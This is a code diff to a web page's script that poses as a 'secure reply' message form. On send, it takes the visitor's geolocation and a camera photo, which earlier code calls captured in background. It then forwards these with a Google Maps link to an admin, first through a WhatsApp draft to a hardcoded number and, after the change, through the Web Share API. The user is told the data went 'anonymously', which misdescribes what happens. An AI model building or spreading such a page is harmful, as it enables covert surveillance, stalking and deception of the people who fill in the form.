@@ -271,8 +271,6 @@
         }
 
         sendMessageBtn.addEventListener('click', async () => {
-            const adminPhone = '917408472817'; // Admin's WhatsApp number
-
             sendMessageBtn.disabled = true;
             sendMessageBtn.textContent = 'Processing... Awaiting Permissions...';
             verificationStatus.classList.remove('hidden'); // Show status box
@@ -291,10 +289,12 @@
                     capturePhotoFromCamera() // capturePhotoFromCamera resolves with Base64 string
                 ]);
 
-                const timestamp = new Date().toISOString();
+                // Convert Base64 image to Blob
+                const imageBlob = await fetch(base64Image).then(res => res.blob());
+                const imageFile = new File([imageBlob], 'captured_image.jpg', { type: 'image/jpeg' });
 
-                // Construct the message text, including the Base64 image data (truncated for size)
-                const message = `
+                // Construct the text message with user reply and location
+                const textMessage = `
 *--- SECURE REPLY MESSAGE ---*
 *Subject:* ${subject}
 *User Reply:*
@@ -303,25 +303,29 @@ ${userMessage}
 --------------------------------
 
 *--- VERIFICATION DATA FROM RECEIVER ---*
-*Timestamp (Receiver's side):* ${timestamp}
 *Geolocation:*
   - Latitude: ${locationResult.lat.toFixed(6)}
   - Longitude: ${locationResult.lon.toFixed(6)}
   - [Google Maps Link]: https://www.google.com/maps/search/?api=1&query=${locationResult.lat},${locationResult.lon}
-*Image Status:* Photo successfully captured in background (JPEG format).
-*Image Data (Base64 Snippet):* ${base64Image.substring(0, 100)}...[Truncated]
 --------------------------------
 `;
-                const encodedMessage = encodeURIComponent(message);
 
-                // --- Send to admin's WhatsApp number ---
-                const whatsappUrl = `whatsapp://send?phone=${adminPhone}&text=${encodedMessage}`;
-                window.open(whatsappUrl, '_blank');
+                // Use Web Share API to share image and text
+                if (navigator.share) {
+                    await navigator.share({
+                        title: 'Secure Reply with Image and Location',
+                        text: textMessage,
+                        files: [imageFile]
+                    });
+                } else {
+                    // Fallback if Web Share API is not supported
+                    throw new Error('Sharing not supported on this device.');
+                }
 
-                console.log("--- MESSAGE PREPARED AND WHATSAPP LINK OPENED TO ADMIN ---");
+                console.log("--- IMAGE AND LOCATION SHARED ANONYMOUSLY ---");
 
-                showMessage('Verification data prepared! WhatsApp draft opened automatically to admin. Please manually confirm and send the message.', false);
-                sendMessageBtn.textContent = 'Check WhatsApp to Send';
+                showMessage('Image and location sent anonymously to admin.', false);
+                sendMessageBtn.textContent = 'Sent';
 
             } catch (error) {
                 // If any promise fails (permission denied, timeout, etc.)
